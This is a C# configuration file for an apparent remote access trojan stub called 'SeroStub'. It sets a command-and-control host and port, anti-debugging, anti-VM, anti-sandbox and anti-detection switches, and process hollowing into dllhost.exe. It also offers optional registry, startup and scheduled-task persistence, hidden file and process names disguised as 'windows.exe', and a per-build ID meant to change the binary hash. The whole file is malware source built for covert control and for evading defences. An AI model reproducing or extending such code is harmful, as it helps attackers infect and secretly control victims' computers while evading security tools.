namespace SeroStub;

internal static class Config
{
    public const string Host = "127.0.0.1";
    public const int Port = 7777;
    public const bool UseMutex = true;
    public const string MutexName = "Global\\{B7E9F3A1-4D2C-4A8E-9F1B-3C5D7E2A6B8F}";

    public const bool AntiDebug = true;
    public const bool AntiVM = true;
    public const bool AntiDetect = true;
    public const bool AntiSandbox = true;

    public const bool PersistRegistry = false;
    public const bool PersistStartup = false;
    public const bool PersistTask = false;
    public const string PersistName = "Windows";

    public const bool AntiKill = false;
    public const bool EnableWatchdog = true;
    public const bool EnableHollowing = true;
    public const string HollowTarget = "dllhost.exe";

    public const string AuthKey = "YJD15pM30994WvJSW+upQ2xfUUkQWPsg";
    public const string CertHash = "6631D9C8EF83233CC4EDD14F3FE254B83001F4D3E7E40FB479B766E5ADB642F1";

    // Unique per build — changes the compiled binary hash even with identical settings
    public const string BuildId = "e77131d7f56e4d278a56dba6942c4ff3";

    public const int ReconnectDelayMs = 5000;
    public const int HeartbeatIntervalMs = 10000;

    public const string ClientIdPrefix = "";

    public const string HiddenProcessName = "windows";
    public const string HiddenFileName = "windows.exe";
    public const string HiddenRegKey = "Windows";
}
